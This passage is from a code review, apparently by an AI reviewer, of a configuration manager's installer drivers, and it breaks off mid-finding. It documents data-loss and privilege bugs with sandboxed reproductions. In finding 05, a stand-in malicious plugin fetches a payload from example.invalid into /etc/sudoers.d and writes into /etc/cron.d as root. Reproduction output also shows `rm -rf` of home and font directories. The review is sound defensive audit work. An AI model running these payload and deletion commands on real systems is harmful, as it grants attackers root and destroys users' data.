# Review: Drivers: language toolchains, downloads, builds, post-install

Baseline: `956208e` · 2026-11-08 · reviewer: opus, effort xhigh
Scope: `configsys/drivers/{_alt,appImage,cabal,cargo,clang,font,gcc,gcc_toolset,gem,go_install,group,luarocks,npm,opam,pip,pipx,pyenv,script,sdkman,service,source,tarball}.py` (22 files, read line by line).
Context: `configsys/driver.py`, `configsys/runner.py`, `configsys/versions.py`, `routes.hu`, plus
`paths.py`, `actions.run_plan`/`_may_need_root`/`fail_detail`, `installState.inspect`,
`probecache.py`, `app.diagnostics`/`cmd_fix_scope`/`_owned_index_sources`, `apt.ensure_prereqs`/
`_commit_source`, `plugins.command_source_trusted`/`ships_executable_data`, `routecheck` path lints,
`~/src/configsys-{source,blender,kicad,opencv,bigdata}` (read-only, for ABI/usage).
Tests read: `test_tarball`, `test_source`, `test_appimage`, `test_font`, `test_script_driver`,
`test_pyenv_driver`, `test_sdkman_driver`, `test_service_group_drivers`, `test_service_runit`,
`test_cargo_driver`, `test_pip_driver`, `test_pipx_driver`, `test_npm_driver`, `test_gem_driver`,
`test_go_install_driver`, `test_opam_luarocks_cabal_drivers`, `test_module_batch_index`,
`test_clang_driver`, `test_gcc_driver`, `test_gcc_toolset_driver`, `test_toolchain_dnf`,
`test_locations`, `test_plugin_trust` (all 247 targeted tests pass at baseline).

Reproductions live in `$RUN/scratch/drivers-lang/` (`$RUN` =
`/tmp/claude-1000/-home-schrock-src-configsys/ee26ccb3-…/scratchpad/review-2026-11-08`):
`r_source_clobber.py` (real git, scratch-only), `r_path_guards.py`, `r_small.py`,
`r_pipx_batch.py` (pretend / fake runners), sandbox homes `home2/` (untrusted data plugin
`evilplug/`) and `home3/`.

## Carried over from docs/review-2026-09/drivers-lang-build.md (+ README open items in scope)

| earlier finding | status | evidence |
|---|---|---|
| [HIGH] tarball `rm -rf` of the scope base (android-studio) | fixed | `fcafb84` (route installDir, `_safe_install_dir`, `tarball-no-installdir` lint, tests). The guard is exact-match only → residual class re-reported as drivers-lang-02 |
| [HIGH] source splices network `$VERSION` unquoted | fixed | `7f43966` — `_SAFE_VERSION_RE` at `Driver.resolve_version` + `download_target`. Residual: an explicit `set-version` string → drivers-lang-28 |
| [HIGH] system-scope appImage runs the download as root (icon) | open | still `sudo=self.sudo(rc)` + `cp -Lf` → drivers-lang-04 |
| [HIGH] no download integrity (tarball/appImage/font/source/keys) — README A7 | open | no `sha256:` anywhere in drivers → drivers-lang-19 |
| [MED] archive extraction relies on tool defaults (busybox) | open | `driver.py:283-301` unchanged (drivers-os owns the file); folded into drivers-lang-19 |
| [MED] data plugins carry shell with no prompt | open (partial) | `f066814` gated script/source/glue; `_alt` `ppa:`/`apt-source:` never check `command_trusted` → drivers-lang-05 (also README A10 for `_alt` `key-path`/`list`) |
| [MED] `AltDriver._pm()` host sniffing | open | `_alt.py:76-84` unchanged → drivers-lang-16 (README "D1 follow-on" → drivers-lang-03) |
| [MED] GccToolset duplicates AltDriver | open | `gcc_toolset.py` unchanged → drivers-lang-18 |
| [MED] ModuleDriver base for 10 installers — README D4 | open (partial) | `3fe0f4a` hoisted lock/unlock/is_locked/get_latest; `4c38d08` batching; the table-driven base never landed → drivers-lang-17 |
| [MED] per-component probes (cargo/gem/luarocks/opam/pyenv/sdkman/go) — README C2 | fixed | `4c38d08` (installed_index for gem/luarocks/opam/go-install), `eae03ac` (base batch_index → cargo), `5b64e2b` (sdkman reads the `current` symlink). pyenv still per unit but measured 0.02 s/call — not worth it |
| [MED] go-install reads with bare `go` | open (partial) | `b00b62a` put `_GO_PATH` on reads; GOBIN/GOPATH still ignored → drivers-lang-21 |
| [MED] `Gem.upgrade` omits `--user-install` | open | `gem.py:96-98` → drivers-lang-13 |
| [MED] source archive path is not pristine | open | `source.py:139-145` → drivers-lang-09 |
| [MED] test gaps (dangerous branches) | open (partial) | tarball empty-installDir tests added (`test_tarball.py:241-275`), pyenv op tests added; the rest re-listed under Test gaps |
| [MED] ABI: `privileged` unread; `presudo` dead | fixed (this area) | `privileged` is read by `actions._may_need_root` (`de4d79f`); `presudo` is runner.py (subsystems' file), still accepted-and-ignored at `runner.py:459-462` |
| [MED] home-dir helpers spelled four ways | open | `~`/`$HOME` literals + 4 `_home()` copies remain → drivers-lang-06, drivers-lang-35 |
| [LOW] `!depends` in four docstrings | open | `pip.py:11`, `pipx.py:5`, `appImage.py:16`, `font.py:9` → drivers-lang-33 |
| [LOW] pipx docstring routing claim | obsolete | routes still match (pip on old Ubuntu/Debian/amzn, native elsewhere, `routes.hu:1184-1191`); only the `!depends` wording remains (drivers-lang-33) |
| [LOW] script internal sudo per-op; add `sudo: true` | fixed | `de4d79f`: `_INTERNAL_SUDO_DRIVERS` = script/source/aur pre-auth the batch up front |
| [LOW] `Script._probe` IndexError on groupless `version-re` | open | reproduced → drivers-lang-24 |
| [LOW] `Pyenv.get_version` lexical sort | open | reproduced → drivers-lang-23 |
| [LOW] sdkman/pyenv treat a `version:` dict as a literal | open | `sdkman.py:45-54`, `pyenv.py:27-28` → drivers-lang-32 |
| [LOW] `Pyenv._line` falls back to `rc.comp` | open | `pyenv.py:28` → drivers-lang-32 |
| [LOW] pipx `uv --version` under pretend; cabal `ls` per install | open | reproduced → drivers-lang-30 (cabal `ls` noted in drivers-lang-14) |
| [LOW] `_alt` key unverified, global `trusted.gpg.d` | open | `_alt.py:141,158` → drivers-lang-03 |
| [LOW] `MARKER_PREFIX` + marker read copied 4× | open | → drivers-lang-35 |
| [LOW] `scope()` vs `_scope()`; `\\appImage` docstring | open | `font.py:34`, `appImage.py:1` → drivers-lang-33/35 |
| [LOW] ABI helpers plugins depend on | fixed | `driver.py:13-47` now lists `location_override`, `scoped_dir`, `reconcile_scope` and the frozen hooks (`da0a7ac`); configsys-opencv no longer calls `_scope` (grep) |
| [NIT] `Tarball.set_version` ignores its version | fixed | `targets_version = False` + run_plan refusal (`2a577c0`) |
| [NIT] `_extract_cmd` drops `strip` for zip | open (other area) | `driver.py:289-292` unchanged — drivers-os owns driver.py; not re-reported |
| [NIT] npm batch lists both scopes | obsolete | `get_installed` probes user+system per unit, so both listings are consumed |
| [NIT] `Group.get_version` pipeline | open | → drivers-lang-36 |
| [NIT] font glob misses `.TTF` | open | `font.py:76` → drivers-lang-27 |
| [NIT] toolchain bin dirs prepended three ways | open | now *divergent* → drivers-lang-22 |

## Cross-cutting themes

- **Destructive ops don't read their target first.** `principles.md` says "read the target before
  deleting or overwriting it", but every path driver acts on a computed path and guards (where it
  guards at all) with an exact-match blocklist: tarball `rm -rf`s whatever is at `installDir` (no
  marker check on install, `..` and shared category dirs pass), font `rm -rf`s a `locations:`
  override with no guard, source `checkout -f` + `clean -xfd`s any existing checkout and later
  `rm -rf`s it, appImage `mv -f`s over any file. One shared positive rule (normalized, strictly
  inside a base, not a base/category dir/ancestor, and absent-or-empty-or-carrying-our-marker)
  would close all of them (drivers-lang-01, -02, -26).
- **`$HOME`/`~` in shell vs `paths.home` in Python.** Reads use the configsys home; commands splice
  the ambient `$HOME` (cargo, cabal, go-install, sdkman, script, source, pip/pipx implicitly). So
  `--home` isn't a sandbox for half the drivers, and "where is the managed Go" is answered three
  different ways (drivers-lang-06, -22, -21, -14).
- **`_alt` is a second, unhardened apt.** It re-implements repo setup in a root script and missed
  every apt-driver hardening since: `UBUNTU_CODENAME` fallback, validate-then-commit rollback,
  owned-source diagnosis, `signed-by`, the plugin trust gate. Delegating to the apt driver (the
  README's open "D1 follow-on") fixes drivers-lang-03, -05, -16 in one move.
- **Per-instance caches on per-unit instances.** `get_driver` builds a fresh driver per inspected
  unit and per plan step, so `Pipx._pyver_cache`, `Pipx._backend_flag` and `Pip._pyver` cache
  nothing across units; the batch context is the only cross-unit channel (drivers-lang-15, -30).
- **"One installed version" and scope are not modeled uniformly across module installers.** gem
  keeps several versions (set-version is a no-op downgrade), luarocks/gem can't tell scope, pipx
  doesn't normalize its index key — exactly the drift a table-driven `ModuleDriver` would pin down
  once (drivers-lang-11, -12, -17, -29).

## Findings

### drivers-lang-01 [HIGH] safety — source install wipes a pre-existing checkout's uncommitted work; uninstall/method-swap then `rm -rf`s it
`configsys/drivers/source.py:131-134` (`install`: `[ -d $SRC/.git ] || git clone …` then `checkout -f <ref>` + `clean -xfd`), `:64-66` (`_src_dir`: default `$CONFIGSYS_SRC_DIR/<comp>` = `~/src/<comp>`, or a `locations:` override), `:187-188` (`uninstall`: `rm -rf $SRC` once our marker is there).
Install reuses ANY git checkout already at the source dir — it never checks for its own
`.configsys-<comp>.version` marker — and forces it pristine: tracked edits reverted, untracked
and ignored files deleted. `~/src/<comp>` is exactly where developers keep their own clones, and
the documented `locations:` example is pointing a component at your dev checkout
(`docs/config-format.md:90`, `blender: ~/dev/blender-git`). configsys-source's `desktop.hu:4-11`
even tells suckless users to "edit config.h, then make install" in that tree — `config.h` is
untracked, so the next `install`/`upgrade` deletes it. Install then writes its marker, so a later
`remove` — or an automatic method swap ("switching a method removes the old install first") —
`rm -rf`s the whole tree, `.git` and unpushed commits included. The sibling configsys-blender
driver refuses to do this on purpose (`blender.py:29-30`: "auto-removing a checkout with your
local work is too destructive").
**(reproduced)** `.venv/bin/python $RUN/scratch/drivers-lang/r_source_clobber.py` (a user clone at
`src/dwm` with an untracked `config.h` and an edited tracked file) →
`before: config.h exists = True | config.def.h = my edit to a tracked file` …
`Removing config.h` … `install ok = True` → `after:  config.h exists = False | config.def.h = default`.
**Fix:** before acquisition, if `$SRC` exists and lacks our marker, refuse with a clear message
(`… exists and isn't managed by configsys — move it, or set locations: to adopt it`) or offer an
explicit adopt step that only `fetch`es and never cleans; when the tree IS ours, keep the clean
but refuse when `git status --porcelain` is dirty in tracked files (or stash it). Make
`uninstall` leave the tree by default (blender's choice) or require the marker AND a clean tree.
**Effort:** S. **Tier:** A.

**Verified:** CONFIRMED (reproduced). Severity stays HIGH. `$RUN/scratch/verify-drivers-lang/c2/v01_source.py` drives `Source` through a recording runner (`Runner(pretend=True)`), checks the recorded command (no `sudo`, every path inside the scratch dir) and then runs it with `HOME=<scratch home>`. The setup is a user clone at `<home>/src/dwm` (the default `$CONFIGSYS_SRC_DIR/dwm`) with an untracked `config.h`, an uncommitted edit to `config.def.h` and one unpushed commit. Before install, `get_version` returns `None`, so the plan shows a plain install. The install prints `Removing config.h`; afterwards `config.h exists = False`, `config.def.h` reads `/* upstream default */`, and the marker is written. Uninstall's recorded command is `if [ -f …/src/dwm/.configsys-dwm.version ]; then rm -rf …/src/dwm; fi`, and afterwards `tree exists = False`: `.git` and the unpushed commit are gone. The swap path also runs through the real CLI with no prompt. In a sandbox config with `dwm` routed `source` + `native`, the marker present and `pins: { dwm: native }`, `configsys --home $H --os pop_os!:24.04 --pretend install dwm --no-deps` (no `--yes`, stdin closed) prints `remove source\dwm …`, then `[pretend] if [ -f $H/src/dwm/.configsys-dwm.version ]; then rm -rf $H/src/dwm; fi`, then `apt-get install -y dwm`. No guard exists elsewhere: grepping `configsys/` finds no ownership check, and `test_source.py` pins `clean -xfd` but never tests an unmarked existing tree. One caveat: `install --help` documents "rebuilds from a clean checkout", so scrubbing a tree configsys cloned itself is intended. Even that contradicts configsys-source `desktop.hu:11` ("edit config.h, then `make install`"). The pre-existing-clone case and the `rm -rf` of `.git` on remove/swap are plain data loss.

### drivers-lang-02 [HIGH] safety — the path drivers' destructive-target guards are partial: tarball (`..`, shared dirs, unmanaged dir), font (`locations:` → `rm -rf` anything), source, appImage, path-segment fields
`configsys/drivers/tarball.py:22-24,41-55` (`_safe_install_dir`: exact `Path` equality against a
17-entry list + home + the two scope bases, no normalization), `:125-126` (install's swap `rm -rf
<dir>` runs with no marker check), `:109,116` (`binary:` joined unchecked); `font.py:41-42,73`
(`_font_dir` = the `locations:` override verbatim, then `rm -rf` it — no guard at all);
`source.py:187-188` (`rm -rf` of any `installDir`, e.g. the shared `$CONFIGSYS_SRC_DIR`);
`appImage.py:92` (`mv -f` over whatever `path:` names); `cabal.py:72-74` (`exe:` joined into `rm -f`).
`fcafb84` fixed the empty-`installDir` instance; the class is still open. A user's `locations:`
(documented as "find and manage this component's install here") pointing a font at
`~/.local/share/fonts`, or a tarball at a parent like `~/opt`, deletes everything there; a route
or plugin typo `installDir: "$CONFIGSYS_APP_DIR"` deletes every app; a hand-installed
`~/apps/zig` with no marker reads "missing" and the install `rm -rf`s it.
**(reproduced)** `.venv/bin/python $RUN/scratch/drivers-lang/r_path_guards.py` →
`installDir='../home' -> ALLOWED: rm -rf …/home/../home`, `'$CONFIGSYS_APP_DIR' -> ALLOWED: rm -rf …/home/apps`,
`'~/.config' -> ALLOWED`, `'~/.ssh' -> ALLOWED`, `'/usr/local/bin' -> ALLOWED`, `'/usr/share' -> ALLOWED`;
font with `location-override=<home>` → `rm -rf …/home && mkdir -p …/home`; source
`installDir: $CONFIGSYS_SRC_DIR` uninstall → `rm -rf …/home/src`; appImage `path: ~/.bashrc` →
`mv -f …/.bashrc.configsys-download …/.bashrc`; cabal `exe: ../../.bashrc` → `rm -f ~/.cabal/bin/../../.bashrc` (`r_small.py`).
**Fix:** one helper in `driver.py` (e.g. `Driver.removable_dir(path, rc) -> (path, refusal)`) used by
tarball/font/source/appImage (and offered to plugin build drivers): `os.path.realpath`-normalize;
refuse `/`, any ancestor-or-equal of home / scope bases / the app·sdk·src category dirs / the
state dir, and the top two levels of system trees (`/usr/*`, `/usr/local/*`, `/etc/*`, …); then
require the dir to be absent, empty, or carrying `.configsys-<comp>.version` before `rm -rf`/swap
(else `Result.fail("… exists and isn't managed by configsys")`). Validate single-segment fields
(`binary:`, `exe:`, cabal/go binary names) with the `_DESKTOP_ID`-style regex. Extend the
`tarball-no-installdir` lint to these cases (and to appImage `path:`, see drivers-lang-26).
**Effort:** M. **Tier:** A.

**Verified:** CONFIRMED (reproduced). Severity stays HIGH. Each case below is a user-layer component in sandbox `$RUN/scratch/verify-drivers-lang/c2/f02/home`, run through the real CLI with `--pretend` and `--os pop_os!:24.04`:
- tarball `installDir: "$CONFIGSYS_APP_DIR"` → `rm -rf $H/apps && mv $H/apps.configsys-stage $H/apps`.
- `installDir: "../home"` → `rm -rf $H/../home`, which is `$H` itself (`_safe_install_dir` compares un-normalized `Path`s).
- A hand-installed `~/apps/zig` with no marker → `rm -rf $H/apps/zig`.
- `archive: none` + `installDir: "~/.local/bin"` → `rm -rf $H/.local/bin`, every other binary in it included.
- font + `locations:` at `~/.local/share/fonts` → `rm -rf $H/.local/share/fonts && mkdir -p …`.
- font + `locations:` at `$H` → `rm -rf $H && mkdir -p $H`.
- source `installDir: "$CONFIGSYS_SRC_DIR"`, `remove` → `rm -rf $H/src`.
- appImage `path: "~/.bashrc"` → `mv -f …/.bashrc.configsys-download $H/.bashrc`, then the icon step *executes* `$H/.bashrc`.
- cabal `exe: "../../.bashrc"`, `remove` → `rm -f ~/.cabal/bin/../../.bashrc`.

`configsys check` on this tree gives `0 error(s), 1 warning(s)` (the python-floor warning), and `locations:` values aren't validated anywhere. The likeliest benign trigger is the font case: a user who points `locations:` at their fonts dir loses every font, and font has no guard at all.

### drivers-lang-03 [HIGH] correctness — `_alt` (clang/gcc) vendor-repo setup can leave a poison-pill apt source: derivative codenames, a PPA on Debian, no validate/rollback
`configsys/drivers/_alt.py:131-163` (`_repo_lines`), `:176-187` (`install`), `:197-206` (`uninstall`).
(a) `CODENAME="$(. /etc/os-release; echo "$VERSION_CODENAME")"` (`:154`) — on Linux Mint /
elementary (supported blocks, `routes.hu:47-66`) that is `vanessa`/`wilma`/`horus`, which
apt.llvm.org doesn't serve; `apt.py:206` uses `${UBUNTU_CODENAME:-$VERSION_CODENAME}` and its
comment (`apt.py:191`) claims "Same mechanism the clang/gcc AltDriver uses" — it isn't. (b) The
`ppa:` branch (`:135-137`) has no "distro already carries it" guard (the `apt-source` branch does,
`:155`) and the routes attach the Ubuntu toolchain PPA to `when: "debian"` (`routes.hu:3769-3818`),
so Debian proper adds an Ubuntu PPA that 404s, and Ubuntu adds the *test* PPA even for a gcc-N the
distro ships (it then upgrades libstdc++6 system-wide). (c) The list is written with `tee` before
`apt-get update`; under `set -e` a failed update aborts with the bad file left in place — the
poison pill `principles.md` forbids — and none of apt's `_commit_source` validate-then-rollback
(`apt.py:92-140`) applies. (d) The file isn't a route `source-path`, so `app._owned_index_sources`
(`app.py:1219-1237`) calls it foreign in the refresh diagnosis, and `uninstall` leaves the repo and
a globally-trusted key in `trusted.gpg.d` (carried 2026-09 LOW).
**(reproduced)** `configsys --home $RUN/…/home3 --os linuxmint:21 --pretend install clang-18 --yes --no-deps`
→ `CODENAME="$(. /etc/os-release; echo "$VERSION_CODENAME")"` … `echo 'deb http://apt.llvm.org/'"$CODENAME"'/ llvm-toolchain-'"$CODENAME"'-18 main' | tee /etc/apt/sources.list.d/clang-18.list` … `apt-get update`;
`curl -sL -w '%{http_code}' http://apt.llvm.org/{vanessa,wilma}/dists/llvm-toolchain-…-18/Release` → `404`
(jammy/noble → `200`). `--os debian:12 --pretend install gcc-12` → `add-apt-repository -y ppa:ubuntu-toolchain-r/test`;
`https://ppa.launchpadcontent.net/ubuntu-toolchain-r/test/ubuntu/dists/bookworm/Release` → `404`.
`test_clang_driver.py:54` pins the `VERSION_CODENAME` string.
**Fix:** delegate repo setup to the apt driver: express the LLVM repo as `source-line` +
`pubkey-url`/`pubkey-path` (`signed-by` keyring) and the PPA as `ppa`, run through
`Apt.ensure_prereqs` so `_commit_source` validates and rolls back and the source is "owned"; give
the PPA branch the same madison guard; route-side, gate the PPA bindings `when: "ubuntu"` (Debian
proper uses its own `gcc-N`). Remove the list/key on uninstall when no other unit needs it.
**Effort:** M. **Tier:** B.

**Verified:** CONFIRMED (reproduced), with the Debian half of (b) refuted. Severity stays HIGH. Containers are throwaway `podman run --rm` runs of the exact scripts `--pretend` printed; scripts are in `$RUN/scratch/verify-drivers-lang/c2/f03/ct/`.
- **(a)+(c), confirmed.** `--os linuxmint:21 --pretend install clang-18` prints the `VERSION_CODENAME`-only script. `curl -sSL` of `apt.llvm.org/{vanessa,wilma,horus,faye}/dists/llvm-toolchain-*-18/Release` returns `404`; jammy, noble and bookworm return `200`. I ran the script in ubuntu:22.04 with `/etc/os-release` set to Mint 21's `VERSION_CODENAME=vanessa` (`UBUNTU_CODENAME=jammy`). Output: `_alt script exit: 100`, then `E: The repository 'http://apt.llvm.org/vanessa llvm-toolchain-vanessa-18 Release' does not have a Release file.` `/etc/apt/sources.list.d/clang-18.list` is left holding the vanessa line, and a later, unrelated `apt-get update` also gives `exit 100`. That is the poison pill. It also breaks every later `apt._commit_source` vendor setup, which then reports "failing on a pre-existing apt source".
- **(b) Ubuntu half, confirmed.** In ubuntu:22.04, `install gcc-12` (jammy ships 12.3.0) adds the test PPA and installs jammy's own gcc-12. Afterwards `apt list --upgradable` shows `libgcc-s1/jammy 16-20260315-1ubuntu1~22~ppa1 [upgradable from: 12.3.0-1ubuntu1~22.04.3]`. That is a GCC-16 snapshot runtime the next system upgrade applies; the PPA's jammy pocket also carries `libstdc++6 16-20260315…`.
- **(b) Debian half, refuted as written: no 404 and no poison pill.** In debian:12 the same gcc-12 script does one of two things:
  - Without python3-launchpadlib (software-properties-common doesn't pull it in), `add-apt-repository` crashes (`AttributeError: 'NoneType' object has no attribute 'people'`). The script exits 1 and leaves nothing behind, but gcc-12 fails to install even though Debian ships it (`12.2.0-14+deb12u1`).
  - With launchpadlib, it writes an *empty* `ubuntu-toolchain-r-ubuntu-test-bookworm.list` and adds the PPA key to `trusted.gpg.d`, then installs Debian's own gcc-12.

  Either way, the `when: "debian"` PPA binding is still wrong for Debian.
- **(d), confirmed by reading.** `app._owned_index_sources` collects only `source-path`/`repo-id`, so `diagnose_index_failure` would label `clang-18.list` "NOT managed by configsys".

### drivers-lang-04 [HIGH] security — system-scope appImage install executes the freshly downloaded file as root to extract an icon
`configsys/drivers/appImage.py:100-113` (`_extract_icon`: `{target} --appimage-extract .DirIcon`
with `sudo=self.sudo(rc)`; `cp -Lf` follows a crafted `.DirIcon` symlink), `:63-64` (`_icon_file`
is in the user's home, so under sudo the icon dir/file are created root-owned there).
The URL's content (unverified, drivers-lang-19) runs as root for a menu icon — a privilege the
user never granted (they agreed to put a file in /opt that users run unprivileged). Still open
from 2026-09.
**(reproduced)** `r_path_guards.py` (pretend, `scope: system`) → `sudo tmp=$(mktemp -d) && cd "$tmp" && /opt/apps/app.AppImage --appimage-extract .DirIcon …`.
**Fix:** always run `_extract_icon` unprivileged (`sudo=False`; the file is world-readable after
`chmod +x`), or skip the icon at system scope; `cp -f` without `-L` and reject a `.DirIcon` that
resolves outside `squashfs-root`; write icon/desktop files as the invoking user. Test: system scope
→ the extraction call has no `sudo `.
**Effort:** S. **Tier:** A.

**Verified:** CONFIRMED (reproduced). Severity stays HIGH. Sandbox `$RUN/scratch/verify-drivers-lang/c2/f04` sets `scope: system` and `pins: { arduino: appImage }`, and repeats the core arduino binding with a literal version. `--pretend install arduino --no-deps --yes` prints `[pretend] sudo tmp=$(mktemp -d) && cd "$tmp" && $H/apps/arduino-ide.appimage --appimage-extract .DirIcon >/dev/null 2>&1; if [ -e squashfs-root/.DirIcon ]; then mkdir -p $H/.local/share/icons && cp -Lf …`, and the runner runs that as `sudo bash -c`. It is worse than written in one way: arduino's `path: ~/apps/…` stays home-relative at system scope, so the download step is `sudo mkdir -p $H/apps && curl … -o $H/apps/…`, leaving root-owned files in the user's home. It is narrower in another. 25 of 26 core appImage bindings pin `scope: user`, and `Context.apply_scope_default` only `setdefault`s the machine scope (the user's deliberate fix in `0b636a3`: "scope: system would put appImages under /opt with sudo"). So in core only `arduino` follows a `scope: system` machine, and flatpak outranks it unless it is pinned. It still stays HIGH because any layer can set `scope: system` on an appImage binding, including an untrusted data plugin (appImage isn't trust-gated; see security-02's Verified line). The result is an install-time root execution of a plugin-chosen URL that needs no setting from the user.

### drivers-lang-05 [HIGH] security — an UNTRUSTED plugin's `via: clang/gcc` `ppa:`/`apt-source:` runs as root (and `key-path`/`list` write anywhere), while its `via: script` is refused
`configsys/drivers/_alt.py:131-163,176-187` (no `command_trusted` call); `plugins.py:472-512`
(`ships_executable_data` counts `ppa`/`apt-source` as executable data that makes a plugin
trustable); CLAUDE.md and docs/plugins.md state apt `source-line`/`ppa` are gated by
`command_source_trusted`.
`plugin list` labels such a plugin "ships recipes — untrusted", so the user believes its
recipes can't run; but `_alt` adds the attacker's repo + key (global `trusted.gpg.d`) as root, and
`key-path:`/`list:` are root writes of attacker-fetched bytes to any path (`/etc/sudoers.d/…`) —
README A10's class, unconstrained here. Severity is MED, not HIGH, on the brief's "what could they
already do" rule: an untrusted data plugin can already reach root via a `native-pkg-file` `.deb`
(postinst runs as root, ungated — drivers-os). The contradiction with the documented trust
boundary is the bug.
**(reproduced)** data plugin `$RUN/scratch/drivers-lang/evilplug` added with `plugin add … --local`
(untrusted); `configsys --home …/home2 --os ubuntu:24.04 --pretend install clang-99 --yes --no-deps` →
`curl -fsSL https://example.invalid/payload | tee /etc/sudoers.d/zz >/dev/null` … `-> ok`; same plugin
`install evil-script` → `refusing to run script commands from the untrusted plugin 'evilplug'`.
**Fix:** gate `_alt.install`'s repo lines on `self.command_trusted(rc)` (refuse with
`untrusted_command_result` when `ppa`/`apt-source` came from an untrusted plugin); drop
`key-path`/`list` overrides or confine them to `/etc/apt/{keyrings,trusted.gpg.d,sources.list.d}/`
with a single-segment name; check the same gate in apt's `ppa`/`source-line` (drivers-os). See
Questions (where the trust line should sit for artifact drivers).
**Effort:** S. **Tier:** A.

**Verified:** CONFIRMED (reproduced), and broader than written. Severity MED → HIGH. I built my own untrusted data plugin, `$RUN/scratch/verify-drivers-lang/c2/f05/c2evil`, and added it with `plugin add … --ref v1 --local`; `plugin list` shows `ok  [ships recipes — untrusted; run: configsys plugin trust c2evil]`. It doesn't need a component of its own. It SHADOWS the *core* `clang-18` debian binding (same via + `when:`), and `where clang-18` reports `defined in ~/.config/configsys/plugins/c2evil/routes.hu (overrides routes.hu)` with that binding `<- default here`. Then `--os ubuntu:22.04 --pretend install clang-18 gcc-12 c2-script --no-deps --yes` prints one `sudo` script containing `curl -fsSL https://example.invalid/payload | tee /etc/sudoers.d/zz >/dev/null` and `echo 'deb https://example.invalid/ x main' | tee /etc/cron.d/zz`. For the shadowed core `gcc-12` it prints `add-apt-repository -y ppa:attacker/ppa`. In the same run, the plugin's `via: script` is refused (`c2-script: refusing to run script commands from the untrusted plugin 'c2evil'`). So installing a *core* pick runs the plugin's root commands. Why the severity changed: this is the `_alt` instance of security-01, whose `where` lists `_alt.py:130-192` and which verified at HIGH. The MED here discounts it by the ungated native-pkg-file `.deb`, but that is the same open bug (security-01, drivers-os-01), not a capability the design grants. The designed baseline for an untrusted plugin is user-level code through a download it places (security-02); against that, this path adds root, the same gap security-01 was rated HIGH for. The fix is security-01's gate.

### drivers-lang-06 [MED] safety — `--home` is not a sandbox for the module installers: commands use the ambient `$HOME`/`~` while reads use `paths.home`
`cargo.py:24` (`$HOME/.cargo/bin`), `cabal.py:20,25,59-65,72-74` (`~/.cabal/bin`, `ls ~/.cabal…`),
`go_install.py:30,37` (`~/go/bin`, `$HOME/sdks`), `sdkman.py:27-28` (`source "$HOME/.sdkman/…"`) vs
`:56-72` (reads `paths.home/.sdkman`), `script.py:46`, `source.py:164`; pip/pipx inherit the real
`HOME` (`--user`, `~/.local/pipx`); `font.py:36-38` reads `XDG_DATA_HOME` from the real env.
`--home` is documented as "use DIR in place of $HOME for every path configsys reads or writes
(config, state, user-scope installs)" (`app.py:3627-3629`), and `principles.md` says "pass an
explicit inline HOME to sandboxed subprocesses rather than trusting the ambient one". Today a
sandboxed `inspect` reports the real home's crates and Go tools, and a sandboxed install writes
into the real home; sdkman reads one home and writes another. npm/pyenv/appImage/tarball do honor
`paths.home` — the drivers disagree with each other.
**(reproduced)** with `Paths(CONFIGSYS_HOME=$RUN/…/home3)`: `cargo installed_index under --home sandbox: 10 crates (from the REAL ~/.cargo)`,
`go-install installed_index under --home sandbox: 4 tools (from the REAL ~/go/bin)`;
sdkman `get_version reads …/home3/.sdkman -> None` but `install runs: … source "$HOME/.sdkman/bin/sdkman-init.sh" && sdk install scala`.
**Fix:** when `CONFIGSYS_HOME` is set, have the Context hand the runner a child env with
`HOME=<paths.home>` (and drop inherited `XDG_*_HOME`) — runner.py/app.py, one place; and in the
drivers replace `~`/`$HOME` literals with `self.home()`-derived absolute paths (a new `Driver.home()`
replacing the four `_home()` copies), so reads and writes agree by construction.
**Effort:** M. **Tier:** A.

**Verified:** CONFIRMED (reproduced). Severity stays MED. I kept the real home out of it by running configsys with a fake ambient `HOME=$RUN/scratch/verify-drivers-lang/c2/f06/ambient` and `--home …/c2/f06/sandbox`. Each home has a fake `.cargo/bin/cargo` that logs `$HOME`; the ambient one lists `c2crate v9.9.9`, the sandbox one `v1.0.0-SANDBOX`. `inspect` reports `cargo\c2crate  installed  9.9.9`. The ambient log shows `fake-cargo-called HOME=$W/ambient args=install --list` (and `--version`), and the sandbox cargo was never called. The sdkman split is as written. With `$W/sandbox/.sdkman/candidates/scala/current -> 3.3.0`, `inspect` reports `sdkman\c2sdk  installed  3.3.0`, read from the sandbox. But `--pretend remove c2sdk c2crate` would run `source "$HOME/.sdkman/bin/sdkman-init.sh" && sdk uninstall scala 3.3.0` and `PATH="$HOME/.cargo/bin:$PATH" cargo uninstall c2crate` under the inherited *real* `HOME`. The cause, by reading: `Context.__init__` builds `Runner(pretend=…)` with no env (`app.py:127`), and `runner.child_env` passes `os.environ` through unchanged. That contradicts `--home`'s help text ("every path configsys reads or writes (… user-scope installs)"). npm and pyenv do honor `paths.home` (`npm.py:50,60`, `pyenv.py:22`).

### drivers-lang-07 [MED] correctness — `source` upgrade of a version-less (HEAD) or branch-ref recipe never advances; a changed `repo:` is ignored for an existing tree
`configsys/drivers/source.py:78-84` (`_ref` → `HEAD` / the literal `ref:`), `:131-134`
(`git fetch --tags --force` then `checkout -f HEAD|main` = the LOCAL branch; the fetched
`origin/main` is never checked out; `fetch` uses the existing `origin`, not `repo:`).
All 31 configsys-source `desktop.hu` recipes have no `version:` ("build the default branch"), so
`configsys upgrade dwm` rebuilds the same commit forever; `desktop.hu:6` tells users to "fork the
repo and override `repo:`", which silently does nothing once a tree exists.
**(reproduced)** `r_source_clobber.py` (upstream gets a new commit) → `Your branch is behind 'origin/main' by 1 commit` … `upgrade ok = True | HEAD moved = False | at upstream tip = False`;
`ref: main  upgrade ok = True | at upstream tip = False`.
**Fix:** after fetch, resolve the ref against the remote: for `HEAD`/a branch, `git checkout -f -B
<branch> origin/<branch>` (default branch from `git symbolic-ref refs/remotes/origin/HEAD`); for a
tag/sha keep `checkout -f`. Before fetching, `git remote set-url origin <repo>` when `repo:` changed
(only on a marker-owned tree, drivers-lang-01). Test both with a local repo.
**Effort:** S. **Tier:** B.

### drivers-lang-08 [MED] correctness — `source` at `scope: system` can't work: acquisition, marker and removal run without sudo under `/opt`
`configsys/drivers/source.py:64-73` (system scope → `/opt/src/<comp>`, prefix `/usr/local`),
`:149-153` and `:189` (`runner.run(cmd, capture=False)` — never `sudo`); default `reconcile_scope`
(full rebuild) applies.
`scope: system` is a documented machine setting (`docs/config-format.md:64,115`) and `source`
`honors_scope = True`, so on such a machine every `via: source` pick fails at `mkdir -p /opt/src`
(permission denied); `_may_need_root` pre-auths sudo for nothing.
**(reproduced)** pretend `Source(...).install(ripgrep, scope=system)` → `mkdir -p /opt/src /usr/local && { [ -d /opt/src/ripgrep/.git ] || git clone … /opt/src/ripgrep; } …` (no sudo).
**Fix:** keep the source TREE in user space regardless of scope (it's a build cache, not an
